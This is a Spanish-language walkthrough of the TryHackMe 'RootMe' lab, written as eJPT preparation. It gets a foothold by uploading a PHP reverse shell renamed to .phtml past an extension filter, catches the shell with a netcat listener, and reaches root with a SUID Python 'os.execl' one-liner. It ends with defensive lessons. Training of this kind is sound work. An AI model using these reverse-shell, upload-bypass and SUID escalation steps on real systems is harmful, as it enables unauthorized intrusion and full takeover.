---
title: "RootMe"
date: 2025-10-12
draft: false
description: "Walkthrough de RootMe de TryHackMe. File upload bypass con extensión .phtml, reverse shell y escalada de privilegios via SUID en Python — preparación eJPT."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "file-upload",
    "rce",
    "suid",
    "python",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 3
---

## Resumen

**RootMe** es la tercera máquina de la serie _Road to eJPTv2_ e introduce dos técnicas nuevas que no habían aparecido antes: **bypass de filtros de subida de archivos** y **escalada de privilegios mediante SUID en Python**. A diferencia de las máquinas anteriores donde el acceso fue via credenciales expuestas o RCE directo, aquí necesitamos burlar una restricción de extensiones para subir una reverse shell.

| Atributo       | Valor                                                   |
| -------------- | ------------------------------------------------------- |
| **Plataforma** | TryHackMe                                               |
| **Dificultad** | Fácil                                                   |
| **OS**         | Linux                                                   |
| **Sala**       | [RootMe](https://tryhackme.com/room/rrootme)            |
| **Skills**     | Web Enum, File Upload Bypass, Reverse Shell, SUID Abuse |

### 🎥 Versión en video

{{< youtube ckYf0BX5X5M >}}

> Si prefieres seguir el walkthrough paso a paso, continúa leyendo. El video cubre el mismo proceso en formato visual.

### Herramientas usadas

- `nmap` — enumeración de puertos y servicios
- `gobuster` — fuzzing de directorios
- `php-reverse-shell` — webshell de Pentest Monkey (incluida en Kali)
- `netcat` — listener para reverse shell
- `find` — búsqueda de archivos con permisos SUID

### Resumen de la solución

1. Nmap revela dos puertos: SSH (22) y HTTP (80) con Apache 2.4.41
2. Gobuster descubre el directorio `/panel/` (panel de subida de archivos)
3. El panel bloquea extensiones `.php` — bypass cambiando a `.phtml`
4. La reverse shell se sube correctamente y se ejecuta desde `/uploads/`
5. Flag de usuario encontrada en `/var/www/user.txt`
6. Búsqueda de binarios SUID revela `/usr/bin/python` con bit SUID activo
7. Abuso de Python SUID con `os.execl` para obtener shell como root

---

## Reconocimiento

### Verificación de conectividad

```bash
ping -c 1 10.201.73.204
64 bytes from 10.201.73.204: icmp_seq=1 ttl=60 time=144 ms
```

> **TTL=60** → la máquina objetivo es **Linux**. Consistente con las máquinas anteriores de la serie.

### Escaneo de puertos con Nmap

Primer barrido a todos los puertos TCP:

```bash
nmap 10.201.73.204 -n -Pn -sS -p- --min-rate=5000 -oG allTCPports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Solo dos puertos abiertos. La superficie de ataque es reducida — todo apunta a que el vector principal es la aplicación web.

Escaneo dirigido con versiones y scripts:

```bash
nmap 10.201.73.204 -n -Pn -sS -sVC -p22,80 --min-rate=5000 -oN rootmescan.txt
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
|_http-title: HackIT - Home
| http-cookie-flags:
|   /: PHPSESSID: httponly flag not set
```

> **Hallazgos clave:**
>
> - **Puerto 80:** Apache con título "HackIT" — hay una aplicación web que explorar
> - **PHPSESSID sin flag httponly** — el sitio usa PHP y las cookies son accesibles via JavaScript (útil para ataques XSS en un escenario real)
> - **Puerto 22:** SSH activo — sin credenciales por ahora

### Fuzzing con Gobuster

```bash
gobuster dir -u http://10.201.73.204 \
  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 50 -x php,txt,xml,html,bak
  /index.php   (Status: 200)
  /uploads     (Status: 301)
  /css         (Status: 301)
  /js          (Status: 301)
  /panel       (Status: 301)
```

> **Hallazgo clave:** dos directorios interesantes:
>
> - `/panel/` → panel de subida de archivos (vector de explotación)
> - `/uploads/` → directorio donde se almacenan los archivos subidos (necesario para ejecutar la shell)

La combinación panel de upload + directorio de uploads accesible es el patrón clásico de **file upload vulnerability**.

---

## Explotación

### Panel de subida de archivos

Accedemos a `http://10.201.73.204/panel/` y encontramos un formulario para subir archivos.

![Panel de subida de archivos en /panel/](./upload-panel.png)

El primer intento es subir directamente una reverse shell PHP — el panel la rechaza con un mensaje de error indicando que los archivos `.php` no están permitidos.

### File Upload Bypass: extensión `.phtml`

Los filtros de extensión mal implementados solo bloquean las extensiones más obvias (`.php`). Apache puede ejecutar código PHP con otras extensiones como `.phtml`, `.php5`, `.phar`, entre otras.

Preparamos la reverse shell:

```bash
# Copiamos la reverse shell incluida en Kali
cp /usr/share/webshells/php/php-reverse-shell.php .

# Renombramos
mv php-reverse-shell.php rev.php

# Editamos la IP y puerto (nuestra IP atacante y el puerto del listener)
nvim rev.php

# Cambiamos la extensión para bypass del filtro
mv rev.php rev.phtml
```

> **¿Por qué `.phtml` funciona?** Apache ejecuta como PHP cualquier archivo cuya extensión esté mapeada en su configuración. `.phtml` es una extensión PHP alternativa que muchos filtros básicos no incluyen en su lista negra. Esta es una vulnerabilidad de **validación incompleta de tipos de archivo**.

Subimos `rev.phtml` al panel → el servidor lo acepta con el mensaje "O arquivo foi upado com sucesso!" (el servidor tiene mensajes en portugués, detalle curioso de la sala).

### Reverse Shell

Nos ponemos en escucha en nuestra máquina atacante:

```bash
nc -nlvp 4545
```

Navegamos a la URL donde se subió el archivo para ejecutarlo:

```
http://10.201.73.204/uploads/rev.phtml
```

```bash
connect to [10.13.93.83] from (UNKNOWN) [10.201.73.204] 53644
Linux ip-10-201-73-204 5.15.0-139-generic
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Shell obtenida como `www-data`. Estabilizamos:

```bash
export SHELL=bash
stty rows 41 cols 184
```

> **Nota:** en esta máquina `$SHELL` retorna `/usr/sbin/nologin` (el usuario `www-data` no tiene shell asignada). Por eso exportamos `SHELL=bash` manualmente para que los comandos funcionen correctamente.

---

## Post-explotación

### Enumeración del sistema

Revisamos los directorios home para identificar usuarios del sistema:

```bash
ls -l /home
drwxr-xr-x 4 rootme rootme 4096 rootme
drwxr-xr-x 3 test   test   4096 test
drwxr-xr-x 4 ubuntu ubuntu 4096 ubuntu
```

Tres usuarios: `rootme`, `test`, `ubuntu`. Los directorios home están vacíos, sin información útil inmediata.

### Flag de usuario

Buscamos el archivo `user.txt` en todo el sistema:

```bash
find / -type f -name user.txt 2>/dev/null
/var/www/user.txt
```

```bash
cat /var/www/user.txt
```

> **Flag de usuario:** `THM{y0u_g0t_a_sh3ll}`

Interesante: el flag no está en un directorio home de usuario sino en `/var/www/`. Esto refuerza que el vector de compromiso fue el servidor web.

---

## Escalada de privilegios

### Búsqueda de binarios SUID

Los binarios con el **bit SUID** activo se ejecutan con los permisos del propietario del archivo (no del usuario que los ejecuta). Si un binario SUID pertenece a root y permite ejecutar código arbitrario, tenemos escalada directa.

```bash
find / -perm -4000 2>/dev/null
```

De toda la lista, hay un binario que **no debería tener SUID**:

```bash
/usr/bin/python2.7
```

> **¿Por qué es inusual?** Los intérpretes de lenguajes de scripting (Python, Perl, Ruby) con SUID son extremadamente peligrosos porque permiten ejecutar código arbitrario con los privilegios del propietario. Nunca deberían tener SUID en un sistema productivo. GTFOBins documenta exactamente cómo abusar de esto.

### Abuso de Python SUID

Usando Python para lanzar una shell que herede los privilegios SUID (root):

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```bash
# whoami
root
```

> **¿Qué hace este comando?**
>
> - `import os` importa el módulo del sistema operativo
> - `os.execl("/bin/sh", "sh", "-p")` reemplaza el proceso actual con una shell `/bin/sh`
> - El flag `-p` indica "modo privilegiado" — la shell mantiene el UID efectivo (root) en lugar de caer al UID real (www-data)

### Flag de root

```bash
cd /root
cat root.txt
```

> **Flag de root:** `THM{pr1v1l3g3_3sc4l4t10n}`

---

## Lecciones aprendidas

- **Los filtros de extensión de una sola lista negra son insuficientes** — Bloquear solo `.php` es una falsa sensación de seguridad. Un filtro robusto debería usar lista blanca (solo permitir extensiones específicas como `.jpg`, `.png`) en lugar de lista negra. En un pentest real, este hallazgo sería una vulnerabilidad **crítica**.
- **El directorio `/uploads/` accesible es la segunda mitad del problema** — Subir el archivo es solo el primer paso. Si el servidor no sirve los archivos subidos como ejecutables o los almacena fuera del webroot, el impacto se reduce. Aquí ambas condiciones fallaron.
- **`find / -perm -4000` debe estar en tu checklist de privesc** — Los binarios SUID son uno de los vectores de escalada más comunes en CTFs y en entornos reales mal configurados. Python, Perl, Vim, Bash con SUID son señales de alarma inmediatas.
- **GTFOBins es tu mejor amigo para SUID** — Cuando encuentres un binario inusual con SUID, GTFOBins (gtfobins.github.io) tiene la técnica de explotación lista. Aprende a usarlo como referencia, no solo a memorizar comandos.
- **El flag `-p` en shell es crítico para mantener privilegios** — Sin `-p`, la shell descarta el UID efectivo y caes al UID real. Es un detalle pequeño con impacto enorme.

### Para la eJPT

Esta máquina ejercita habilidades directamente evaluadas en la eJPT:

- Enumeración web con Nmap y Gobuster
- Identificación y explotación de vulnerabilidades de file upload
- Bypass de filtros de extensión
- Reverse shells desde webshells PHP
- Enumeración de binarios SUID
- Escalada de privilegios via SUID abuse

**Tiempo aproximado de resolución:** 25-35 minutos una vez que conoces las técnicas de bypass de file upload.

---

## Referencias

- [RootMe — TryHackMe](https://tryhackme.com/room/rrootme)
- [GTFOBins — Python SUID](https://gtfobins.github.io/gtfobins/python/)
- [PayloadsAllTheThings — File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [Pentest Monkey — PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
